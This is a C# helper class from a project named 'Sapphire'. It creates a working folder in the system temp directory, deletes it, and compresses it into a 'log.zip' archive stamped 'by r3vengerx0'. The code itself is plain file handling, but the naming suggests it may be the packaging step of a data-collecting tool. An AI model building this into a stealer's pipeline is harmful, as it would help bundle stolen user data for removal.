using System;
using System.IO;
using Ionic.Zip;

namespace Sapphire.Modules.Helpers
{
    class FileManager
    {
        private static string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
        private static string TempPath = Path.GetTempPath() + "\\";

        public static string CreateDirectory(string path)
        {
            string ppath = path;
            if (path == "work")
                ppath = TempPath + "sapphire";

            if (!Directory.Exists(ppath))
                Directory.CreateDirectory(ppath);

            return ppath + "\\";
        }

        public static void DeleteDirectory(string path)
        {

            if (path == "all")
            {

                if (Directory.Exists(TempPath + "sapphire"))
                    Directory.Delete(TempPath + "sapphire", true);
            }

            if (Directory.Exists(path))
                Directory.Delete(path, true);

            
        }

        public static string GetWorkDirectory()
        {
            if (Directory.Exists(TempPath + "sapphire"))
                return TempPath + "sapphire\\";

            return null;
        }

        public static void ArchiveDirectory(string path = null)
        {
            string ppath = TempPath + "sapphire";
            if (!string.IsNullOrEmpty(path))
                ppath = path;

            try
            {
                using (ZipFile zip = new ZipFile(System.Text.Encoding.GetEncoding("cp866")))
                {
                    zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                    zip.Comment = "by r3vengerx0";
                    zip.AddDirectory(ppath);
                    zip.Save(TempPath + "log.zip");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[ERROR]can't archive\n{e}");
            }
        }
    }
}
